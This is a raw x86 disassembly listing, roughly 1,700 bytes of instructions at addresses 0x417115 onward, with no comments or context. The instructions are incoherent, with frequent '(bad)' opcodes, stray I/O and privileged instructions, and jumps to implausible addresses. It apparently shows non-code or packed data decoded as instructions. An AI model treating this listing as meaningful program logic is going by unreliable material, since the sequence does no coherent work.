  417115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417116:	ror    BYTE PTR [edi+0x47b0e3f8],cl
  41711c:	mov    ax,0x92ed
  417120:	push   0xcb477fe5
  417125:	jb     0x41712a
  417127:	lods   eax,DWORD PTR ds:[esi]
  417128:	fnstenv [eax+0x2a]
  41712b:	push   0x4c224f61
  417130:	push   cs
  417131:	ja     0x4170f4
  417133:	inc    eax
  417134:	addr16 sub eax,ebp
  417137:	jbe    0x417121
  417139:	test   eax,0x7a4cf0fb
  41713e:	aaa    
  41713f:	sub    eax,0x7c49ed75
  417144:	mov    eax,ds:0x4adb2c75
  417149:	repz jno 0x4170d6
  41714c:	mov    cl,0xbe
  41714e:	push   ss
  41714f:	and    ah,BYTE PTR [edi-0x4648f053]
  417155:	pop    ebx
  417156:	fisttp DWORD PTR [esp+esi*2-0x64c52996]
  41715d:	jp     0x4171d1
  41715f:	pop    edi
  417160:	xor    eax,DWORD PTR [edi+0x7d]
  417163:	and    DWORD PTR [edx-0x45],edx
  417166:	xor    esp,DWORD PTR [esi-0x7c]
  417169:	sub    bh,BYTE PTR [ecx-0x1c]
  41716c:	sub    eax,0x97f4b4f6
  417171:	fistp  DWORD PTR [esp+ecx*8-0x5e9ec484]
  417178:	inc    ebx
  417179:	in     al,0x56
  41717b:	dec    ecx
  41717c:	sar    BYTE PTR [esi],cl
  41717e:	ins    BYTE PTR es:[edi],dx
  41717f:	xchg   edi,eax
  417180:	adc    ah,dl
  417182:	lods   al,BYTE PTR ds:[esi]
  417183:	push   ebp
  417184:	ja     0x41712d
  417186:	push   esp
  417187:	popf   
  417188:	add    edi,ebx
  41718a:	cs aas 
  41718c:	sub    DWORD PTR [eax+0x141d3661],esi
  417192:	jae    0x41717c
  417194:	(bad)  
  417195:	fld    TBYTE PTR [ecx]
  417197:	mov    ch,BYTE PTR ds:0x76da0c09
  41719d:	push   edi
  41719e:	(bad)  
  41719f:	mov    WORD PTR [ebp+edx*1+0x6d],?
  4171a3:	nop
  4171a4:	pop    esp
  4171a5:	scas   eax,DWORD PTR es:[edi]
  4171a6:	sbb    edi,edx
  4171a8:	jb     0x4171ef
  4171aa:	call   0xb8e28ba9
  4171af:	inc    edi
  4171b0:	xor    eax,0x961a8ac4
  4171b5:	fld    QWORD PTR [esi+ebp*4-0x14]
  4171b9:	inc    edi
  4171ba:	in     al,dx
  4171bb:	pop    esi
  4171bc:	imul   ebx,DWORD PTR [ecx+0x2b00ecda],0x51b5427e
  4171c6:	fidiv  WORD PTR [eax-0xa]
  4171c9:	pop    eax
  4171ca:	clc    
  4171cb:	push   ss
  4171cc:	add    bl,al
  4171ce:	mov    ebp,0xa25bde27
  4171d3:	daa    
  4171d4:	sub    BYTE PTR [esi+ecx*8-0x77],dh
  4171d8:	rsm    
  4171da:	xchg   ebp,eax
  4171db:	sub    al,0xa
  4171dd:	pop    ds
  4171de:	sub    eax,0x4dff3a4d
  4171e3:	loop   0x417214
  4171e5:	dec    ebp
  4171e6:	lods   al,BYTE PTR ds:[esi]
  4171e7:	cmp    esp,esi
  4171e9:	inc    edi
  4171ea:	ja     0x4171b6
  4171ec:	pop    ebx
  4171ed:	push   esi
  4171ee:	add    eax,0x7afbd075
  4171f3:	mov    edx,0x2118f113
  4171f8:	shl    DWORD PTR [eax+esi*1],0x99
  4171fc:	jmp    0x23b98ab7
  417201:	fwait
  417202:	ss neg ah
  417205:	mov    BYTE PTR [ecx-0x80],bh
  417208:	pop    ebx
  417209:	push   ss
  41720a:	xlat   BYTE PTR ds:[ebx]
  41720b:	xor    eax,0x51cde64
  417210:	pop    ebp
  417211:	inc    edi
  417212:	push   ecx
  417213:	jmp    0xeb23:0xdf1d50c0
  41721a:	mov    fs,WORD PTR [ebx-0x1f39cf3d]
  417220:	pop    edx
  417221:	or     eax,0x51ac980
  417226:	and    DWORD PTR [ebx+0x9c9213],eax
  41722c:	mov    edi,0x2176e22f
  417231:	shr    BYTE PTR [edi-0x31],1
  417234:	mov    dl,BYTE PTR [ebx]
  417236:	fnstcw WORD PTR [eax+eax*1-0x369a8c19]
  41723d:	mov    ds:0xd63656be,al
  417242:	out    0xc7,al
  417244:	push   cs
  417245:	mov    ebp,0xaf91a59f
  41724a:	int3   
  41724b:	adc    eax,0x87e64ac4
  417250:	js     0x417215
  417252:	dec    edi
  417253:	or     eax,0x1302470
  417258:	push   edi
  417259:	js     0x417231
  41725b:	mov    ds:0x1b5cd46,al
  417260:	repz xchg ebp,eax
  417262:	imul   BYTE PTR [esi+0x6280077a]
  417268:	inc    ecx
  417269:	xor    BYTE PTR [edi-0x36acc6a8],dh
  41726f:	nop
  417270:	lea    ebp,[ecx-0x2c]
  417273:	ins    BYTE PTR es:[edi],dx
  417274:	fwait
  417275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417276:	and    dh,BYTE PTR [eax]
  417278:	jne    0x4172c3
  41727a:	pop    edi
  41727b:	fldcw  WORD PTR [ecx+0x5a]
  41727e:	cdq    
  41727f:	idiv   BYTE PTR [edx-0x73]
  417282:	fndisi(8087 only) 
  417284:	dec    esi
  417285:	cmp    al,0xa5
  417287:	hlt    
  417288:	add    eax,0xaf02f6f2
  41728d:	sahf   
  41728e:	pop    ss
  41728f:	call   0xfb2779ed
  417294:	mov    WORD PTR [edx+esi*1-0x72491195],es
  41729b:	(bad)  
  41729c:	retf   0x2bd7
  41729f:	mov    ah,0x38
  4172a1:	cdq    
  4172a2:	nop
  4172a3:	pushf  
  4172a4:	mul    BYTE PTR [eax-0x661c4167]
  4172aa:	faddp  st(7),st
  4172ac:	(bad)  
  4172ad:	rcr    DWORD PTR [ebx],0x78
  4172b0:	jae    0x417322
  4172b2:	push   esp
  4172b3:	rcr    DWORD PTR [ebx],cl
  4172b5:	xchg   edx,eax
  4172b6:	repz ror esi,0x9f
  4172ba:	cwde   
  4172bb:	(bad)  
  4172bc:	jbe    0x4172a3
  4172be:	mov    ebp,0x569551d5
  4172c3:	and    eax,0x3c9ae7fd
  4172c8:	dec    ebx
  4172c9:	xchg   ebp,eax
  4172ca:	cmp    BYTE PTR [esi],bl
  4172cc:	data16 fcmovne st,st(0)
  4172cf:	enter  0x158d,0x2b
  4172d3:	fistp  WORD PTR [edi+0x4a20603b]
  4172d9:	push   ebx
  4172da:	ror    DWORD PTR [edi],1
  4172dc:	cmp    BYTE PTR [ecx+ecx*1-0x5e],bl
  4172e0:	mov    DWORD PTR [ebx],ebx
  4172e2:	ret    0xd413
  4172e5:	imul   esi,edi,0x1c
  4172e8:	xor    DWORD PTR ds:0xbe60379a,0xffffffc1
  4172ef:	loope  0x417342
  4172f1:	push   eax
  4172f2:	xor    DWORD PTR [eax+0x19528f08],esp
  4172f8:	stos   DWORD PTR es:[edi],eax
  4172f9:	imul   ebx,DWORD PTR [eax],0x37593a6f
  4172ff:	jae    0x4172ff
  417301:	in     al,0x8d
  417303:	test   BYTE PTR [eax+0x3b],cl
  417306:	cmp    eax,eax
  417308:	ins    BYTE PTR es:[edi],dx
  417309:	cmp    ebp,DWORD PTR [edi+ebp*1+0x72]
  41730d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41730e:	xchg   ecx,eax
  41730f:	inc    edx
  417310:	fdiv   DWORD PTR [eax]
  417312:	fwait
  417313:	dec    ebp
  417314:	add    al,0x58
  417316:	test   DWORD PTR [edx+edi*4+0x2ddccb5f],0x66059cc3
  417321:	mov    edx,DWORD PTR [ebx]
  417323:	loop   0x417354
  417325:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  417327:	sti    
  417328:	ja     0x417358
  41732a:	out    0xaf,eax
  41732c:	div    edi
  41732e:	fcmovne st,st(7)
  417330:	popa   
  417331:	rol    DWORD PTR [ebp-0x3b631a68],cl
  417337:	leave  
  417338:	xor    al,0xf8
  41733a:	sbb    al,0x7a
  41733c:	push   0x6523b31
  417341:	les    ebx,FWORD PTR [ebx]
  417343:	cmp    al,0x8b
  417345:	scas   eax,DWORD PTR es:[edi]
  417346:	mov    dl,BYTE PTR [eax]
  417348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417349:	scas   eax,DWORD PTR es:[edi]
  41734a:	stos   BYTE PTR es:[edi],al
  41734b:	cmp    eax,0x2b30e601
  417350:	pop    ecx
  417351:	mov    ebp,0xbf8e1144
  417356:	jae    0x41734c
  417358:	imul   esp,ebx,0xaa3359f
  41735e:	jp     0x4173d5
  417360:	pusha  
  417361:	sbb    BYTE PTR ds:0xbf5beede,bh
  417367:	loopne 0x41730b
  417369:	mov    gs:0x49248c16,al
  41736f:	dec    edx
  417370:	mov    eax,ds:0x831d36d0
  417375:	sub    al,0xd6
  417377:	jmp    0x4172f9
  417379:	mov    ebx,0x2602404a
  41737e:	push   esp
  41737f:	icebp  
  417380:	push   ebp
  417381:	dec    edi
  417382:	stos   DWORD PTR es:[edi],eax
  417383:	pop    ebp
  417384:	aas    
  417385:	je     0x4173c3
  417387:	xor    eax,0xcc34f273
  41738c:	das    
  41738d:	or     bl,BYTE PTR [esi]
  41738f:	jns    0x417402
  417391:	sub    edi,DWORD PTR [edx-0x229edb10]
  417397:	scas   eax,DWORD PTR es:[edi]
  417398:	sub    DWORD PTR [ebx+edi*4+0x4b],esi
  41739c:	dec    eax
  41739d:	gs xor dl,ah
  4173a0:	in     al,0xa9
  4173a2:	add    eax,0x1205e236
  4173a7:	mov    bl,0x9d
  4173a9:	sbb    edx,DWORD PTR ds:0x9ee3cd6b
  4173af:	fwait
  4173b0:	sbb    edi,eax
  4173b2:	pop    edi
  4173b3:	adc    al,0x15
  4173b5:	ins    BYTE PTR es:[edi],dx
  4173b6:	jmp    0xd52a:0xc2c09a33
  4173bd:	push   es
  4173be:	sbb    edx,DWORD PTR [edi+0x353adbf7]
  4173c4:	pop    ebx
  4173c5:	adc    al,al
  4173c7:	sub    al,0x47
  4173c9:	addr16 call 0x943712a1
  4173cf:	sahf   
  4173d0:	loope  0x4173f3
  4173d2:	sbb    DWORD PTR [edx-0x5e38dd46],ecx
  4173d8:	ror    DWORD PTR [ecx],1
  4173da:	jne    0x417393
  4173dc:	aas    
  4173dd:	dec    edi
  4173de:	inc    ebp
  4173df:	mov    ebp,0x26292e94
  4173e4:	or     ebp,DWORD PTR [edi]
  4173e6:	mov    eax,ds:0x2842ed18
  4173eb:	into   
  4173ec:	mov    bl,0xbe
  4173ee:	sbb    BYTE PTR [eax-0x49],ah
  4173f1:	fs lahf 
  4173f3:	mov    al,0x7f
  4173f5:	adc    eax,0x7c83b853
  4173fa:	arpl   WORD PTR [ebp+0x4f],ax
  4173fd:	jns    0x4173cb
  4173ff:	gs push es
  417401:	sub    DWORD PTR [edi+edi*2-0x71a61eb7],ecx
  417408:	std    
  417409:	xchg   edx,eax
  41740a:	mov    dl,0x8e
  41740c:	and    esp,DWORD PTR [esi]
  41740e:	xor    cl,BYTE PTR [ebx]
  417410:	add    DWORD PTR [esi],eax
  417412:	and    eax,0x9d5e7d46
  417417:	stos   BYTE PTR es:[edi],al
  417418:	or     al,0x3f
  41741a:	inc    esp
  41741b:	xchg   edx,eax
  41741c:	imul   ebp,DWORD PTR [ebp-0x42ce7564],0xa8ea451b
  417426:	jne    0x417400
  417428:	sar    BYTE PTR [edi-0x45],1
  41742b:	in     eax,0x99
  41742d:	dec    ebp
  41742e:	mov    al,ds:0xbf219b63
  417433:	add    al,0x76
  417435:	xlat   BYTE PTR ds:[ebx]
  417436:	sar    BYTE PTR [ecx+0x75],0x58
  41743a:	ja     0x4173d3
  41743c:	icebp  
  41743d:	fdivr  QWORD PTR ds:0x7e03e6a7
  417443:	imul   edx,DWORD PTR [ebp-0x32],0x9b56a7c4
  41744a:	xor    eax,0xdb9945e0
  417450:	jae    0x41742f
  417452:	mov    eax,ds:0xbbf0e1e6
  417457:	sub    ah,BYTE PTR [eax+0x40]
  41745a:	imul   esp,DWORD PTR [edi],0xa035915e
  417460:	pop    es
  417461:	in     eax,dx
  417462:	xor    ah,BYTE PTR [edx]
  417464:	mov    DWORD PTR [edi+0x27],esp
  417467:	push   ebx
  417468:	jle    0x41747f
  41746a:	cli    
  41746b:	retf   
  41746c:	pop    es
  41746d:	iret   
  41746e:	push   es
  41746f:	jae    0x41743d
  417471:	mov    cl,0x92
  417473:	pop    edi
  417474:	dec    edx
  417475:	ret    
  417476:	add    ebx,DWORD PTR [edi+0x587aa41]
  41747c:	sbb    eax,0x56399449
  417481:	pop    eax
  417482:	jmp    0x417427
  417484:	sbb    esp,DWORD PTR [ebx+0x50c2f5e3]
  41748a:	jg     0x4174ca
  41748c:	cmp    DWORD PTR fs:[ebx],esi
  41748f:	push   ebp
  417490:	ss add ecx,edi
  417493:	mov    al,ds:0x36ce9ba
  417498:	pop    esi
  417499:	repz addr16 aam 0x20
  41749d:	call   0xdaa7:0x966d05f6
  4174a4:	add    ah,BYTE PTR [ebx+edi*4-0x3698f39b]
  4174ab:	push   eax
  4174ac:	xor    BYTE PTR gs:[esi+esi*1-0x7df5a436],al
  4174b4:	push   ebx
  4174b5:	aad    0x97
  4174b7:	popa   
  4174b8:	fs int 0x6a
  4174bb:	dec    edx
  4174bd:	sub    ah,BYTE PTR [esp+eiz*2]
  4174c0:	mov    al,0x20
  4174c2:	sbb    al,0x7f
  4174c4:	mov    ds:0x7db1d2c9,al
  4174c9:	mov    dl,0xb5
  4174cb:	aaa    
  4174cc:	ja     0x41744f
  4174ce:	mov    ds:0x73601eed,al
  4174d3:	sbb    BYTE PTR [ebx-0x25],0xfe
  4174d7:	xor    esp,DWORD PTR [ebx+0x3f7dc355]
  4174dd:	mov    bl,0x3e
  4174df:	dec    esi
  4174e0:	pop    es
  4174e1:	mov    esi,0xa745dccd
  4174e6:	sbb    BYTE PTR [ecx],cl
  4174e8:	dec    esp
  4174e9:	or     BYTE PTR [eax-0x5281c36a],cl
  4174ef:	retf   0x552b
  4174f2:	mov    cl,0xaf
  4174f4:	jno    0x4174a2
  4174f6:	ja     0x4174b2
  4174f8:	sub    eax,0x54880ff
  4174fd:	repnz ins BYTE PTR es:[edi],dx
  4174ff:	inc    ecx
  417500:	out    dx,eax
  417501:	xor    DWORD PTR [ebx+eiz*2-0x5d0068da],eax
  417508:	pop    esi
  417509:	pop    eax
  41750a:	sbb    al,0x6
  41750c:	sbb    esp,DWORD PTR [ebx+0x41]
  41750f:	and    eax,0xdc063669
  417514:	js     0x4174aa
  417516:	popa   
  417517:	dec    edx
  417518:	(bad)  
  417519:	lods   eax,DWORD PTR ds:[esi]
  41751a:	ja     0x417557
  41751c:	jnp    0x41754b
  41751e:	sub    DWORD PTR [edi-0xb3620c0],esp
  417524:	jmp    0x4174ca
  417526:	xor    BYTE PTR [edx-0x58c1ae04],dh
  41752c:	out    0xdd,al
  41752e:	shl    BYTE PTR [edx+0x69],1
  417531:	repz (bad) 
  417533:	push   0x4c
  417535:	add    BYTE PTR [edx+ebx*8],al
  417538:	outs   dx,BYTE PTR ds:[esi]
  417539:	test   al,0xdf
  41753b:	pop    edi
  41753c:	out    dx,al
  41753d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41753f:	in     eax,0x70
  417541:	mov    al,0x44
  417543:	(bad)  
  417544:	bnd jno 0x417593
  417547:	sbb    DWORD PTR [ebp+0x78e63cf8],ebx
  41754d:	stos   BYTE PTR es:[edi],al
  41754e:	pusha  
  41754f:	pop    eax
  417550:	jle    0x417535
  417552:	dec    bh
  417554:	dec    eax
  417555:	pop    edi
  417556:	pusha  
  417557:	clc    
  417558:	(bad)  
  417559:	push   esp
  41755a:	mov    esp,0xe84ce505
  41755f:	add    dl,BYTE PTR [ecx+0x66095ee9]
  417565:	push   ds
  417566:	and    eax,0x1a5d83
  41756b:	xor    dh,cl
  41756d:	xchg   edx,eax
  41756e:	jmp    0x3a87c22d
  417573:	and    DWORD PTR [edi],0xffffffc7
  417576:	xor    ah,bh
  417578:	mov    esp,0x815c86fb
  41757d:	or     al,0x3b
  41757f:	pop    ds
  417580:	jbe    0x41756b
  417582:	push   ss
  417583:	jp     0x417508
  417585:	pop    es
  417586:	pop    esi
  417587:	int    0xa6
  417589:	jg     0x417593
  41758b:	test   al,0x40
  41758d:	cmp    dl,ch
  41758f:	mov    dl,0x61
  417591:	iret   
  417592:	cld    
  417593:	mov    edi,0x6650bbee
  417598:	push   ds
  417599:	adc    BYTE PTR [edx-0xd3ab572],dl
  41759f:	out    0xc1,eax
  4175a1:	fidivr WORD PTR [ebp-0x7e]
  4175a4:	add    DWORD PTR [ebp+0x519a0da0],eax
  4175aa:	loop   0x41757f
  4175ac:	in     eax,dx
  4175ad:	jno    0x4175c6
  4175af:	imul   ebp,DWORD PTR es:[eax],0xffffff96
  4175b3:	lods   al,BYTE PTR ds:[esi]
  4175b4:	loop   0x417612
  4175b6:	dec    edi
  4175b7:	adc    DWORD PTR [ecx],edi
  4175b9:	xchg   esp,eax
  4175ba:	push   es
  4175bb:	xchg   edi,eax
  4175bc:	retf   0x7bd9
  4175bf:	fwait
  4175c0:	inc    ecx
  4175c1:	out    dx,al
  4175c2:	imul   edi,DWORD PTR [esi-0x7690cdbc],0xabd12f4e
  4175cc:	xor    eax,0x617e18fe
  4175d1:	cld    
  4175d2:	dec    ebx
  4175d3:	mov    dh,ah
  4175d5:	mov    eax,0xce57c5b3
  4175da:	add    eax,0x6bf29276
  4175df:	imul   eax,DWORD PTR ds:0xed1f99ab,0x87475047
  4175e9:	aam    0xf7
  4175eb:	push   ecx
  4175ec:	xchg   esp,eax
  4175ed:	jl     0x417640
  4175ef:	ja     0x4175c1
  4175f1:	arpl   WORD PTR [ecx],cx
  4175f3:	(bad)  
  4175f5:	adc    eax,0xbf650d44
  4175fa:	aas    
  4175fb:	cmp    al,0x85
  4175fd:	add    DWORD PTR [ecx+eax*1+0x4316db82],eax
  417604:	push   edi
  417605:	xchg   edx,eax
  417606:	and    edx,ebp
  417608:	std    
  417609:	mov    WORD PTR [ecx-0x245f9e13],fs
  41760f:	jmp    0xba3a0340
  417614:	push   esi
  417615:	or     cl,BYTE PTR [ecx+esi*1+0x51]
  417619:	lahf   
  41761a:	enter  0x30d0,0x6a
  41761e:	ss and al,0x22
  417621:	or     BYTE PTR [edi-0x7bc4589b],bh
  417627:	inc    esp
  417628:	sub    bh,BYTE PTR [ebp-0x3f7b534f]
  41762e:	push   eax
  41762f:	iret   
  417630:	je     0x4175f5
  417632:	test   al,0x7a
  417634:	mov    ebx,0xf67afb87
  417639:	xchg   esp,eax
  41763a:	pop    es
  41763b:	test   ah,cl
  41763d:	(bad)  
  41763e:	ins    DWORD PTR es:[edi],dx
  41763f:	inc    edi
  417640:	mov    edi,0x3832237a
  417645:	pop    esi
  417646:	inc    esp
  417647:	and    bh,BYTE PTR [esi-0x7]
  41764a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41764b:	mov    dl,bl
  41764d:	test   eax,0x6e3d112d
  417652:	(bad)  es:[ebx+ebp*8-0x45c616d9]
  41765a:	mov    ah,0xb6
  41765c:	and    al,0x7
  41765e:	mov    ds:0x8dd024da,eax
  417663:	pop    esp
  417664:	adc    eax,0x86435e4e
  417669:	sahf   
  41766a:	mov    al,ds:0x90eb5772
  41766f:	jnp    0x417637
  417671:	bnd jp 0x417612
  417674:	retf   0x9f63
  417677:	adc    ecx,DWORD PTR [ecx-0x59870a81]
  41767d:	inc    esi
  41767e:	sbb    ebx,ecx
  417680:	les    ebp,FWORD PTR [eax+0x75]
  417683:	ror    BYTE PTR ds:0xfdb44acc,cl
  417689:	mov    WORD PTR [ecx+0x2922e9d1],es
  41768f:	mov    esp,0x33d171c4
  417694:	xor    eax,DWORD PTR [edx+0x4]
  417697:	jb     0x41764a
  417699:	cs mov edi,0xe04948ee
  41769f:	sbb    BYTE PTR [edi+0x519914d7],ch
  4176a5:	arpl   WORD PTR [edx],bx
  4176a7:	aaa    
  4176a8:	inc    esp
  4176a9:	repz dec eax
  4176ab:	xor    al,0xb5
  4176ad:	dec    esp
  4176ae:	inc    eax
  4176af:	add    BYTE PTR ds:0x9971a56b,ch
  4176b5:	imul   esp,DWORD PTR [esi-0x43953ae4],0xffffffa2
  4176bc:	inc    ebp
  4176bd:	popa   
  4176be:	mov    al,ds:0xc1c10e3d
  4176c3:	mov    al,0xd0
  4176c5:	neg    DWORD PTR [esi-0x56]
  4176c8:	pop    esi
  4176c9:	sub    al,0x5
  4176cb:	jae    0x4176d3
  4176cd:	xor    DWORD PTR ds:0x72015002,edx
  4176d3:	jg     0x417685
  4176d5:	push   esp
  4176d6:	adc    eax,0xfaa33316
  4176db:	int3   
  4176dc:	push   0xeb19e066
  4176e1:	and    eax,0x9cca65f9
  4176e6:	jmp    0x4176a8
  4176e8:	xchg   ebx,eax
  4176e9:	xchg   ebp,eax
  4176ea:	pop    ebx
  4176eb:	movd   mm5,DWORD PTR [esi+0x27d5387c]
  4176f2:	mov    ebp,0xfe8a135d
  4176f7:	mov    ah,0x83
  4176f9:	mov    esp,0xfcfcdf77
  4176fe:	push   eax
  4176ff:	sbb    bl,bh
  417701:	sbb    ebx,esi
  417703:	lock lods al,BYTE PTR ds:[esi]
  417705:	add    ah,BYTE PTR [edx-0x14]
  417708:	cmp    al,0xac
  41770a:	fdiv   QWORD PTR [ecx-0x38]
  41770d:	cmp    al,0x1
  41770f:	scas   al,BYTE PTR es:[edi]
  417710:	repz out dx,eax
  417712:	cmp    eax,0xee0d0119
  417717:	xchg   DWORD PTR [ebx+0x790ce0f2],edi
  41771d:	hlt    
  41771e:	and    al,0x16
  417720:	jge    0x41779e
  417722:	mov    dh,0xd4
  417724:	push   es
  417725:	std    
  417726:	pop    es
  417727:	or     al,0xc1
  417729:	mov    WORD PTR gs:[edx-0x4d],cs
  41772d:	ret    
  41772e:	and    eax,0x8959bd67
  417733:	gs pop ebp
  417735:	xor    DWORD PTR [ebp+0x3102c2c5],eax
  41773b:	call   0x89fc:0x60010606
  417742:	xor    esi,DWORD PTR [ecx+0xd]
  417745:	in     eax,0x82
  417747:	rcr    BYTE PTR [ebx],0xdf
  41774a:	cld    
  41774b:	pop    eax
  41774c:	xchg   ecx,eax
  41774d:	outs   dx,DWORD PTR ds:[esi]
  41774e:	das    
  41774f:	pop    edi
  417750:	or     edx,esp
  417752:	aaa    
  417753:	mov    cl,0x70
  417755:	call   0xf5db:0x4813641b
  41775c:	sbb    al,0x6e
  41775e:	iret   
  41775f:	xor    eax,0xfb939fcd
  417764:	mov    ch,0xb0
  417766:	push   esi
  417767:	or     eax,0x5708b5a0
  41776c:	pop    ecx
  41776d:	icebp  
  41776e:	jno    0x4177a4
  417770:	call   0x52c8:0x840097eb
  417777:	push   edx
  417778:	inc    ecx
  417779:	mov    al,ds:0x65fbd126
  41777e:	xor    ebp,esp
  417780:	ja     0x4177e9
  417782:	inc    edx
  417783:	imul   DWORD PTR [edi-0x12]
  417786:	add    BYTE PTR [ecx+edi*8+0x5],0x5
  41778b:	(bad)  
  41778c:	ds cwde 
  41778e:	pop    ecx
  41778f:	dec    edx
  417790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417791:	pop    ebp
  417792:	cmp    esi,DWORD PTR [ebp+edx*8+0x142caac9]
  417799:	jg     0x41774f
  41779b:	pop    ebx
  41779c:	mov    dh,0xa2
  41779e:	out    dx,al
  41779f:	jo     0x417737
  4177a1:	add    ebx,esi
  4177a3:	dec    ebp
  4177a4:	clc    
  4177a5:	int    0x27
  4177a7:	retf   
  4177a8:	fist   DWORD PTR [edi+0xae7d527]
  4177ae:	cdq    
  4177af:	(bad)  
  4177b0:	xchg   esi,eax
  4177b1:	pop    eax
  4177b2:	out    dx,al
  4177b3:	dec    ebp
  4177b4:	xchg   DWORD PTR [ebp+0x3a656372],eax
  4177ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177bb:	mov    esp,0x1f1b299a
  4177c0:	call   0x9de0de87
  4177c5:	xchg   edx,eax
  4177c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177c7:	and    BYTE PTR [ebx+ebp*1+0x0],0x2b
  4177cc:	mov    eax,ds:0xb6fc671e
  4177d1:	and    edx,ecx
  4177d3:	sbb    eax,0x552ff1c0
  4177d8:	sub    bl,bh
  4177da:	icebp  
  4177db:	std    
  4177dc:	or     DWORD PTR [eax],esp
  4177de:	jbe    0x417767
  4177e0:	call   0xbd73a04d
  4177e5:	pop    ebx
  4177e6:	or     al,BYTE PTR [ebx-0x30]
  4177e9:	in     eax,0x10
  4177eb:	lods   al,BYTE PTR ds:[esi]
  4177ec:	mov    bl,0x7
  4177ee:	mov    ebx,0x51d05960
  4177f3:	xchg   ecx,eax
  4177f4:	pop    ebx
  4177f5:	stos   DWORD PTR es:[edi],eax
  4177f6:	pop    es
  4177f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177f8:	in     eax,0x65
  4177fa:	icebp  
  4177fb:	lds    ecx,FWORD PTR [edx-0x632beaa6]
  417801:	sbb    DWORD PTR [esi-0x58612171],ebp
  417807:	or     al,0xb9
  417809:	xchg   ebp,eax
  41780a:	les    esi,FWORD PTR [ecx-0x2a]
  41780d:	out    0x38,al
  41780f:	js     0x417805
  417811:	mov    esp,0x993aac83
  417816:	ds push ebx
  417818:	add    BYTE PTR [ecx*2-0x5d1335c8],ch
  41781f:	cmp    DWORD PTR [ebp-0x69],eax
  417822:	inc    esp
  417823:	mov    ah,0x3c
  417825:	mov    ebp,0xbec7daa9
  41782a:	imul   esi,eax,0x39
  41782d:	in     eax,dx
  41782e:	jae    0x41780d
  417830:	or     dl,BYTE PTR ds:0x70e854b4
  417836:	out    0xe,eax
  417838:	enter  0x7ad4,0x5
  41783c:	cwde   
  41783d:	cmc    
  41783e:	adc    edi,ebp
  417840:	sub    eax,0x4cb0d534
  417845:	or     al,BYTE PTR [ebp-0x5b]
  417848:	mov    eax,ds:0x2f80f252
  41784d:	and    eax,0x839e98f9
  417852:	fwait
  417853:	aaa    
  417854:	je     0x417891
  417856:	div    al
  417858:	pop    edi
  417859:	lds    eax,FWORD PTR [edi+0x4f3c6135]
  41785f:	cs in  eax,0x84
  417862:	inc    eax
  417863:	fsub   DWORD PTR [ecx]
  417865:	or     eax,0xb6f60653
  41786a:	adc    eax,0x4f3d545f
  41786f:	fild   DWORD PTR [ebx-0x7738b641]
  417875:	or     al,0x41
  417877:	and    edx,DWORD PTR ds:0xe7dbbc1d
  41787d:	lds    edx,FWORD PTR [edx]
  41787f:	(bad)  [ebx]
  417881:	xchg   esp,eax
  417882:	in     eax,0x5b
  417884:	push   0xfffffff2
  417886:	jo     0x4178f7
  417888:	bnd jle 0x417903
  41788b:	pop    ebx
  41788c:	(bad)  
  41788d:	stc    
  41788e:	and    eax,0x22e363cc
  417893:	scas   eax,DWORD PTR es:[edi]
  417894:	les    esp,FWORD PTR [edx]
  417896:	repz inc esi
  417898:	sub    ah,BYTE PTR [ebx]
  41789a:	push   ss
  41789b:	mov    bh,0x92
  41789d:	imul   ebp,DWORD PTR es:[esi-0x56889d9e],0x47
  4178a5:	fldenv [ebx+edx*2]
  4178a8:	in     al,0x66
  4178aa:	jo     0x4178fd
  4178ac:	jge    0x41785e
  4178ae:	mov    bl,BYTE PTR [edx-0x3ddae004]
  4178b4:	(bad)  
  4178b6:	jge    0x41790d
  4178b8:	ret    0xffc7
  4178bb:	sub    BYTE PTR [ebp-0x72],cl
  4178be:	mov    dh,BYTE PTR [edx]
  4178c0:	les    eax,FWORD PTR [edx+eiz*8-0x7b]
  4178c4:	or     BYTE PTR [edi+0x6e0a39f],dh
  4178ca:	sets   BYTE PTR [edi]
  4178cd:	dec    ebp
  4178ce:	mov    al,ds:0x726cf65f
  4178d3:	xchg   ebp,eax
  4178d4:	xlat   BYTE PTR ds:[ebx]
  4178d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178d6:	aaa    
  4178d7:	dec    ecx
  4178d8:	xor    ebx,DWORD PTR [ebx-0x2e]
  4178db:	js     0x4178f7
  4178dd:	jmp    0x41794e
  4178df:	sub    DWORD PTR [ebx+edi*2],ecx
  4178e2:	add    DWORD PTR [ecx-0x16],edi
  4178e5:	or     esi,DWORD PTR es:0x5256755e
  4178ec:	or     al,0xc3
  4178ee:	in     al,dx
  4178ef:	sbb    ecx,DWORD PTR [edi+0x8]
  4178f2:	mov    edi,0xca40d25
  4178f7:	shl    BYTE PTR [edi+0x7f],0x37
  4178fb:	out    dx,eax
  4178fc:	sub    eax,0x72adc11b
  417901:	dec    esi
  417902:	aas    
  417903:	scas   eax,DWORD PTR es:[edi]
  417904:	mov    DWORD PTR [ecx-0x43724e],esi
  41790a:	nop
  41790b:	cdq    
  41790c:	mov    ds:0x39ae427,eax
  417911:	cwde   
  417912:	fisttp DWORD PTR [eax-0x528abf0b]
  417918:	jecxz  0x417913
  41791a:	ja     0x4178e5
  41791c:	sub    DWORD PTR [ecx-0x2c],ebx
  41791f:	cli    
  417920:	ja     0x4178a8
  417922:	aad    0x2a
  417924:	repz mov ebx,0x70488483
  41792a:	mov    ebx,0x18ec9741
  41792f:	xor    al,0x3a
  417931:	sbb    cl,BYTE PTR [edx]
  417933:	mov    ds:0x59d3b42b,eax
  417938:	adc    edi,DWORD PTR [ebp+0x4a546508]
  41793e:	mov    al,ds:0xdb3007e3
  417943:	dec    eax
  417944:	add    eax,0xebf4b1cf
  41794a:	inc    edi
  41794b:	into   
  41794c:	loopne 0x41790a
  41794e:	jmp    0x7dfc959
  417953:	dec    ebx
  417954:	or     eax,0x7133be87
  417959:	cld    
  41795a:	push   ebx
  41795b:	mov    bl,0x8
  41795d:	push   esp
